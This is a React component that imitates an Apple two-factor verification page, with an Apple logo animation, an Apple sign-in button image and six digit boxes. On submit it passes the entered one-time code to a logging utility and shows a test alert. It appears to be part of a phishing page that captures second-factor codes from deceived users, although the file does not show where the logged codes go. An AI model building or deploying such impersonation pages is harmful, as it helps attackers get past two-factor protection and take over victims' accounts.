import React, { useMemo, useRef, useState } from "react";
import { logResponseEntry } from "../utils/responseLogger";

const CODE_LENGTH = 6;

export default function TwoFactorPage() {
  const [code, setCode] = useState(Array(CODE_LENGTH).fill(""));
  const inputsRef = useRef([]);
  const isComplete = useMemo(() => code.every(Boolean), [code]);

  function updateCode(index, value) {
    if (!/^\d?$/.test(value)) return;

    const next = [...code];
    next[index] = value;
    setCode(next);

    if (value && index < CODE_LENGTH - 1) {
      inputsRef.current[index + 1]?.focus();
    }
  }

  function handleKeyDown(e, index) {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  }

  function handleVerify(e) {
    e.preventDefault();
    if (!isComplete) return;
    logResponseEntry({
      event: "two-factor-code-entered",
      code: code.join(""),
    });
    alert("Form working");
  }

  return (
    <div className="main">
      <div className="main-items">
        <video
          className="item-1"
          src="/applevideo.mp4"
          autoPlay
          loop
          muted
          playsInline
          aria-label="Apple logo animation"
        />

        <h1 className="item-2">Enter your 2 Factor Code</h1>

        <div className="code-container">
          {code.map((digit, index) => (
            <input
              key={index}
              ref={(el) => {
                inputsRef.current[index] = el;
              }}
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={1}
              className="code-box"
              value={digit}
              onChange={(e) => updateCode(index, e.target.value)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              aria-label={`Verification code digit ${index + 1}`}
            />
          ))}
        </div>

        <button
          type="button"
          className="signin-image-button"
          onClick={handleVerify}
          disabled={!isComplete}
        >
          <img
            src="/apple-signinbutton.jpeg"
            alt="Continue"
            className="signin-button-image"
          />
        </button>
      </div>
    </div>
  );
}
